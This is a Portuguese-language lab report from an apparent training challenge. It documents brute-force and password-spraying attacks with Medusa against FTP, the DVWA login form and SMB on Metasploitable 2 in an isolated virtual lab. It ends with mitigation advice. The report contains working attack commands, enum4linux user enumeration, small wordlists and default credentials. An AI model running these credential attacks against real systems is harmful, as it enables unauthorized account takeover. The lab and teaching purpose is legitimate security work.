Relatório de Simulação: Ataques de Força Bruta e Mitigação com Medusa

1. Visão Geral

Este projeto foi desenvolvido como parte do desafio prático da plataforma DIO (Digital Innovation One), com o objetivo de demonstrar a execução e análise de ataques de autenticação (Força Bruta e Password Spraying) utilizando o Kali Linux e a ferramenta Medusa, direcionados a um ambiente controlado (Metasploitable 2 e DVWA).

O relatório documenta as configurações de rede, os cenários testados, os comandos aplicados e as melhores práticas de mitigação para proteger serviços essenciais.

2. Arquitetura do Ambiente de Laboratório

O laboratório foi estruturado totalmente isolado em ambiente virtualizado via VirtualBox para garantir segurança durante a execução dos testes.

Atacante: Kali Linux

IP: 192.168.56.10

Ferramentas: Medusa, Nmap, Enum4linux, Hydra.

Alvo: Metasploitable 2 (com DVWA hospedado)

IP: 192.168.56.101

Modo de Rede: Host-Only (Rede Interna/Exclusiva de Hospedeiro)

3. Estrutura de Dicionários (Wordlists)

Para a realização dos testes simulados, foram utilizadas wordlists simplificadas de teste localizadas em /tmp/:

Usuários (/tmp/users.txt):

admin
user
msfadmin
root
service


Senhas (/tmp/passwords.txt):

123456
password
admin
msfadmin
letmein


4. Execução dos Cenários de Teste

Cenário 1: Força Bruta em Serviço FTP (Porta 21)

O objetivo foi identificar credenciais válidas no serviço FTP do Metasploitable 2.

Comando Utilizado:

medusa -h 192.168.56.101 -U /tmp/users.txt -P /tmp/passwords.txt -M ftp -v 4


Resultado / Validação:

Acesso confirmado com as credenciais msfadmin:msfadmin.

Validação de acesso realizada via cliente FTP interativo:

ftp 192.168.56.101
# Authenticated successfully as msfadmin


Cenário 2: Automação em Formulário Web (DVWA)

Simulação de ataque contra o formulário de Login do Damn Vulnerable Web Application (DVWA) configurado no nível de segurança Low.

Comando Utilizado:

medusa -h 192.168.56.101 -u admin -P /tmp/passwords.txt -M http -m DIR:/dvwa/login.php -m FORM:"login.php?username=ADMIN&password=PASS&Login=Login" -m DENY:"Login failed"


Resultado / Validação:

Identificada a combinação válida: admin:password.

Confirmação do login e navegação através da interface web.

Cenário 3: Password Spraying e Enumeração em SMB (Porta 445/139)

Primeiro foi realizada a enumeração dos usuários do serviço Samba/SMB e, em seguida, executada a técnica de Password Spraying (testar uma única senha comum contra uma lista de múltiplos usuários para evitar bloqueio de contas).

1. Enumeração de Usuários (Nmap / Enum4linux):

enum4linux -U 192.168.56.101


2. Execução do Password Spraying com Medusa:

medusa -h 192.168.56.101 -U /tmp/users.txt -p "msfadmin" -M smb


Resultado / Validação:

Validação do par de credenciais msfadmin:msfadmin via smbclient:

smbclient -L //192.168.56.101/ -U msfadmin


5. Recomendações de Mitigação e Prevenção

Para prevenir ataques de força bruta e password spraying nos ambientes de produção, recomendam-se as seguintes diretrizes de segurança:

Política de Bloqueio de Conta (Account Lockout Policy):

Configurar limites de tentativas incorretas (ex.: bloquear temporariamente a conta após 3 a 5 tentativas malsucedidas).

Uso de Autenticação Multifator (MFA):

Implementar MFA em todos os serviços de acesso remoto e portais web.

Complexidade e Reutilização de Senhas:

Exigir senhas fortes (comprimento mínimo de 12 a 16 caracteres, incluindo caracteres especiais) e proibir credenciais padrão de fábrica.

Implementação de Rate Limiting e CAPTCHA:

Adicionar restrição de taxa de requisições por IP em formulários web e mecanismos de CAPTCHA após falhas sucessivas.

Monitoramento e IDS/IPS:

Configurar regras de detecção no Fail2ban ou SIEM para identificar picos incomuns de falhas de autenticação em curtos intervalos.

6. Conclusão

O exercício permitiu demonstrar a eficácia e velocidade do Medusa em simulações de auditoria de senhas em múltiplos protocolos (FTP, HTTP e SMB). As técnicas executadas ressaltam a importância vital de controles de autenticação robustos e monitoramento contínuo.
